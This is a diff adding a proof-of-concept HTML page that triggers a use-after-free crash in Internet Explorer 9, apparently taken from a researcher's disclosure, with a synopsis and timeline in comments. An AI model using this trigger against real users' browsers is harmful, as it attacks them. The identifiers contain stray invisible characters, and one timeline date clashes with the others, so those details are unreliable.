@@ -1,0 +1,51 @@
+<!--
+Source: http://blog.skylined.nl/20161216001.html
+
+Synopsis
+
+A specially crafted web-page can trigger a use-after-free vulnerability in Microsoft Internet Explorer 9. I did not investigate this vulnerability thoroughly, so I cannot speculate on the potential impact or exploitability.
+
+Known affected software and attack vectors
+
+Microsoft Internet Explorer 9
+
+An attacker would need to get a target user to open a specially crafted web-page. Disabling Java­Script should prevent an attacker from triggering the vulnerable code path.
+
+Details
+
+This bug was found back when I had very little knowledge and tools to do analysis on use-after-free bugs, so I have no details to share. ZDI revealed that this was a use-after-free vulnerability in their advisory. I have included a number of reports created using a predecessor of Bug­Id below.
+
+Repro.html:
+-->
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <script defer>
+      var o­Element = document.get­Element­By­Id("ruby");
+      var o­Element = o­Element.parent­Node.remove­Child(o­Element);
+      document.write("<abbr></abbr>");
+      document.document­Element.offset­Top;
+      set­Timeout("location.reload()", 100);
+    </script>
+  </head>
+  <body>
+    <abbr dir="ltr">
+      <ruby id="ruby" dir="rtl">
+      </ruby>
+    </abbr>
+  </body>
+</html>
+
+<!--
+Time-line
+
+Sometime in October 2012: This vulnerability was found through fuzzing.
+29 October 2012: This vulnerability was submitted to EIP.
+27 November 2013: This vulnerability was rejected by EIP.
+14 January 2013: This vulnerability was submitted to ZDI.
+6 February 2013: This vulnerability was acquired by ZDI.
+13 February 2013: This vulnerability was disclosed to Microsoft by ZDI.
+29 May 2013: This vulnerability was address by Microsoft in MS13-021.
+16 December 2016: Details of this vulnerability are released.
+-->
